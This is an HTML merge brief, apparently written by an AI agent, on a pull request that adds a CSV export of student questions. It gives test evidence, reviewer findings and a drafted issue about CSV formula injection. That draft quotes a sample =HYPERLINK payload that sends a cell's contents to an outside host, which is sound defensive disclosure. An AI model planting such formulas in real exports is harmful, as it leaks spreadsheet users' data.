@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>B-T2 merge brief</title>
+<style>
+body{font:15px/1.5 -apple-system,system-ui,sans-serif;margin:0;padding:16px;color:#1d1d1f;background:#fff;max-width:860px}
+.strip{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:6px;margin-bottom:18px}
+.strip div{border:1px solid #ddd;border-radius:8px;padding:8px}
+.strip b{display:block;font-size:11px;text-transform:uppercase;color:#666;letter-spacing:.04em}
+.strip .you{background:#fff6c2;border-color:#e6c800}
+h1{font-size:20px;margin:0 0 4px}h2{font-size:17px;margin:24px 0 6px}
+table{border-collapse:collapse;width:100%;font-size:14px}
+td,th{border-top:1px solid #e3e3e3;padding:6px 4px;vertical-align:top;text-align:left}
+th{font-size:12px;color:#555;text-transform:uppercase}
+.ok{color:#1a7f37;font-weight:700}.no{color:#b42318;font-weight:700}
+.who{font-size:12px;padding:1px 6px;border-radius:10px;background:#e8f0fe;white-space:nowrap}
+code,pre{font:13px ui-monospace,Menlo,monospace;background:#f3f3f3;border-radius:4px}
+code{padding:1px 4px;word-break:break-word}pre{padding:8px;overflow-x:auto;white-space:pre-wrap}
+.box{border:1px solid #ccc;border-radius:10px;padding:10px 12px;margin:12px 0}
+.choices{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:8px}
+.choices div{border:1px solid #ccc;border-radius:8px;padding:8px}
+.choices .rec{border-color:#1a7f37;background:#f0faf2}
+.tag{font-size:12px;padding:1px 6px;border-radius:10px;background:#eee;white-space:nowrap}
+.warn{background:#fff4f2;border-color:#f3b5ab}
+</style></head><body>
+
+<div class="strip">
+ <div><b>Status</b>Ship: PR #17 ready for review, up to date with main, CI green. Not merged.</div>
+ <div class="you"><b>From you</b>Nothing. Run ended at Stop 2: PR left open, not merged.</div>
+ <div><b>Risk</b>risk:medium (CI). <code>owner-ok</code> not needed; risk-gate passes.</div>
+ <div><b>Updated</b>2026-11-20</div>
+</div>
+
+<h1>Issue #4: export a class's questions as CSV. PR #17</h1>
+<p><a href="https://github.com/Natenc12/pipeline-lab/pull/17">github.com/Natenc12/pipeline-lab/pull/17</a> · branch <code>b-t2/csv-export</code> · 2 commits · <b>2 new files, 147 lines added, nothing else touched</b>. Contract built as signed: you answered Stop 1 with "the contract stands as written". Nothing departs from it.</p>
+
+<h2>The contract, ticked</h2>
+<p><small>CI = GitHub ran it and it is green. Reviewer = the fresh review agent reproduced it independently. Builder says = my run only.</small></p>
+<table>
+<tr><th></th><th>Contract line</th><th>Who</th><th>Shown by</th></tr>
+<tr><td colspan="4"><b>Examples of done</b></td></tr>
+<tr><td class="ok">✓</td><td>Worked example (Biology, 4 questions, #4 hidden) returns exactly the string shown</td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td><code>test_worked_example_returns_exactly_the_string_shown</code></td></tr>
+<tr><td class="ok">✓</td><td>No questions, or only hidden ones → header line only</td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td><code>test_class_with_no_questions_returns_header_only</code>, <code>test_class_with_only_hidden_questions_returns_header_only</code></td></tr>
+<tr><td class="ok">✓</td><td><code>Line one\nline two</code> appears as <code>"Line one\nline two"</code></td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td><code>test_line_break_in_question_is_quoted_and_kept</code></td></tr>
+<tr><td class="ok">✓</td><td>Questions from other classes never appear</td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td><code>test_questions_from_other_classes_never_appear</code></td></tr>
+<tr><td class="ok">✓</td><td><code>export_class_questions(conn, 999)</code> → <code>LookupError</code></td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td><code>test_unknown_class_raises_lookup_error</code></td></tr>
+<tr><td colspan="4"><b>Must not change</b></td></tr>
+<tr><td class="ok">✓</td><td>Every existing module, function and test unchanged</td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td><code>git diff --name-status origin/main...HEAD</code> → only <code>A src/lab/export.py</code>, <code>A tests/test_export.py</code>. CI ran all 103 old tests plus 9 new: 112 passed</td></tr>
+<tr><td class="ok">✓</td><td>The schema: no migration</td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td><code>migrations/</code> untouched; CI's "migrate twice" step green</td></tr>
+<tr><td class="ok">✓</td><td>Hidden questions stay out of anything a teacher exports</td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td>worked-example test (#4 hidden), <code>test_hidden_question_left_out_between_visible_ones</code>; reviewer also checked a hidden question <i>with</i> an answer</td></tr>
+<tr><td colspan="4"><b>Decisions</b></td></tr>
+<tr><td class="ok">✓</td><td>Returns a <code>str</code>, writes no file; <code>from lab.export import export_class_questions</code></td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td>tests import it that way and assert <code>str</code>; reviewer: no file or DB writes (<code>total_changes</code> unchanged)</td></tr>
+<tr><td class="ok">✓</td><td>Header exactly <code>question_id,student,asked_at,question,answer</code></td><td><span class="who">CI</span></td><td>every test compares the full string</td></tr>
+<tr><td class="ok">✓</td><td>One row per visible question, ordered by id ascending</td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td><code>test_rows_ordered_by_question_id_not_asked_at</code>; reviewer: 50 questions, all present in order</td></tr>
+<tr><td class="ok">✓</td><td>Columns: id, student name, <code>asked_at</code> as stored, text, answer body or empty</td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td>worked example; reviewer: non-ISO <code>asked_at</code> passed through as is</td></tr>
+<tr><td class="ok">✓</td><td>Quoting is <code>csv.writer</code>'s default (QUOTE_MINIMAL)</td><td><span class="who">CI</span> <span class="who">Reviewer</span></td><td>the code <i>is</i> <code>csv.writer(buf, lineterminator="\n")</code>; <code>test_quoting_applies_to_student_and_answer_columns_too</code>. See the <code>\r</code> note below</td></tr>
+<tr><td class="ok">✓</td><td>Every line ends with <code>\n</code>, including the last</td><td><span class="who">CI</span></td><td>full-string comparisons</td></tr>
+<tr><td class="ok">✓</td><td>No visible questions → header only</td><td><span class="who">CI</span></td><td>as above</td></tr>
+<tr><td class="ok">✓</td><td>Unknown <code>class_id</code> → <code>LookupError</code> (via <code>get_class</code>)</td><td><span class="who">CI</span></td><td>as above</td></tr>
+<tr><td colspan="4"><b>Scope Out</b></td></tr>
+<tr><td class="ok">✓</td><td>No CLI command, no file writing, no other formats, no filtering or paging, no change to existing modules or schema</td><td><span class="who">Reviewer</span></td><td>diff is two new files; the function takes only <code>conn, class_id</code></td></tr>
+</table>
+
+<div class="box warn"><b>Accepted at Stop 1, still true (not bugs in this PR, but you should know):</b>
+<ul>
+<li><b>Lone <code>\r</code>:</b> on CI's Python 3.10, a field with a bare <code>\r</code> is not quoted, so a spreadsheet would split that row. Python 3.11+ quotes it. That is what <code>csv.writer</code>'s default does, and the contract says to use it. <span class="tag">Reviewer reproduced</span></li>
+<li><b>Formula injection:</b> student text starting with <code>= + - @</code> is exported as is and becomes a live formula in a spreadsheet. <span class="tag">Reviewer noted</span> The follow-up text is recorded below; per your instruction it is not filed.</li>
+</ul></div>
+
+<h2>Your call</h2>
+<div class="choices">
+ <div class="rec"><b>Merge</b> (recommended). The contract is met; CI is green; no <code>owner-ok</code> needed (risk:medium). Then: you merge PR #17 (I never merge in this run), and I close #4 and drop <code>in-progress</code> only with your go-ahead.</div>
+ <div><b>Change</b>: tell me what to change. Then: I make it, re-run CI and the checks, update this page and stop again.</div>
+ <div><b>Hold</b>: PR stays open as is. Then: nothing more happens; the sandbox is cleaned up, the branch stays.</div>
+</div>
+<div class="box"><b>Follow-up, recorded here instead of filed.</b> Owner, 2026-11-20: no GitHub actions in this run beyond the PR and the <code>in-progress</code> label. Nothing was filed. This is the issue text, to file later if wanted:<pre>Title: CSV export: student text starting with = + - @ becomes a live formula in spreadsheets
+
+## Problem
+
+`export_class_questions` (issue #4) writes question text and student names exactly as stored. When a
+teacher opens the CSV in Excel or Google Sheets, a cell that starts with `=`, `+`, `-` or `@` is
+treated as a formula (&quot;CSV injection&quot;). Students type the question text, so a student can put a
+formula into the teacher&#x27;s spreadsheet, e.g.
+`=HYPERLINK(&quot;https://example.com/?&quot;&amp;B2,&quot;Click for the answer&quot;)`, which sends another cell&#x27;s contents
+to an outside site when clicked.
+
+## Why it matters
+
+The export exists so teachers can open it in a spreadsheet. Some spreadsheets warn about the worst
+forms, but not all.
+
+## Options to decide at triage
+
+- Prefix any field starting with `= + - @`, tab or `\r` with a single quote `&#x27;` (OWASP&#x27;s advice).
+  Cost: a real question like `-5 squared?` shows as `&#x27;-5 squared?` in a plain-text viewer.
+- Leave the data exact and warn teachers in the docs / CLI once an export command exists.
+
+Related: on Python 3.10 (CI&#x27;s version) `csv.writer(lineterminator=&quot;\n&quot;)` does not quote a field
+containing a lone `\r`, so such a question splits its row in a spreadsheet; Python 3.11+ quotes it.
+Accepted as-is in #4; could be fixed in the same change.
+
+Found while working #4 (PR #17).</pre></div>
+
+<h2>Calls made without you</h2>
+<ul>
+<li><span class="tag">Low stakes</span> I read "the contract stands as written" as: card 1 = keep <code>csv.writer</code>'s default (lone <code>\r</code> unquoted on 3.10); card 2 = export exact text and only <i>draft</i> the follow-up. Say if you meant otherwise.</li>
+<li><span class="tag">Low stakes</span> Ran the agent review although this PR is risk:medium and read-only SQL (step 6 lists database work; I treated a new query as close enough).</li>
+<li><span class="tag">Low stakes</span> Added three tests beyond the five examples: ordering by id (not <code>asked_at</code>), a hidden question between visible ones, and quoting in the student and answer columns (the last one after the reviewer pointed out only the question column was tested).</li>
+<li><span class="tag">Low stakes</span> One SQL query (inner join to <code>students</code>, left join to <code>answers</code>) instead of reusing <code>list_questions</code>, which pages and looks off by one (<code>max(first_row - 1, 0)</code>: page 2 repeats a row).</li>
+<li><span class="tag">Low stakes</span> Unknown class handled by calling the existing <code>get_class</code>, so its message and exception type are the same.</li>
+</ul>
+
+<h2>CI checks (<code>gh pr checks 17 --repo Natenc12/pipeline-lab</code>, unedited)</h2>
+<pre>risk-gate	pass	7s	https://github.com/Natenc12/pipeline-lab/actions/runs/44810242130/job/136544635245
+ruff + pytest (lab)	pass	11s	https://github.com/Natenc12/pipeline-lab/actions/runs/44810242324/job/136544634825	</pre>
+<p><small>CI log: <code>Ruff</code> "All checks passed!", <code>Tests</code> "112 passed". Head commit <code>559d7d9</code>; branch up to date with <code>main</code> (<code>gh pr update-branch</code>: already up to date).</small></p>
+
+<div class="box"><b>Builder's view.</b> I agree with the rules' risk:medium. The change adds code and changes nothing that already exists: one read-only query and the standard library's CSV writer. The real risks are the two accepted above, and they only matter once a teacher opens the file in a spreadsheet. Nothing calls the function yet, since a CLI command is out of scope. So merging changes no current behaviour.</div>
+
+<h2>Reviewer findings</h2>
+<p>Fresh agent, contract only. <b>Blocking: none. Departures from the contract: none.</b> Its 17 own checks passed on Python 3.10. Non-blocking: (1) lone <code>\r</code> not quoted (accepted at Stop 1); (2) formula injection (accepted at Stop 1); (3) builder's tests did not cover quoting in the student/answer columns or classes over 20 questions. I fixed the quoting part with a new test. I left the over-20 part, because the code does not page, and the reviewer's 50-question check passed.</p>
+
+<h2>Not checked</h2>
+<ul>
+<li>Opening the CSV in real Excel, Numbers or Google Sheets.</li>
+<li>Speed on a large class. The query uses the existing <code>questions(class_id, id)</code> index, but I timed nothing.</li>
+<li>Python 3.11+: CI runs 3.10 only. On 3.11+ the only output difference I know of is the lone <code>\r</code> case (Builder says: I ran <code>csv.writer</code> on 3.10–3.13).</li>
+</ul>
+
+<h2>Files worth reading</h2>
+<ul>
+<li><code>src/lab/export.py</code> (37 lines): the whole feature</li>
+<li><code>tests/test_export.py</code>: one test per Example of done, named after it</li>
+</ul>
+
+<h2>Undo</h2>
+<ul>
+<li>Before merge: <code>gh pr close 17 --repo Natenc12/pipeline-lab --delete-branch</code>, then <code>gh issue edit 4 --repo Natenc12/pipeline-lab --remove-label in-progress</code>.</li>
+<li>After merge: <code>git revert -m 1 &lt;merge commit&gt;</code> on a branch and open a PR. It removes two files and nothing else, with no data or schema involved.</li>
+</ul>
+
+<h2>Also noticed, outside this ticket (no action taken)</h2>
+<ul>
+<li><code>list_questions</code> offset off by one (page 2 repeats the last row of page 1).</li>
+<li><code>class_summary</code>'s <code>total</code> counts hidden questions, though its docstring says they are not counted. <code>student_breakdown</code>'s <code>count(*)</code> after a left join counts a student with no questions as 1.</li>
+</ul>
+<p><small>I can draft issues for these if you want; nothing has been filed.</small></p>
+</body></html>
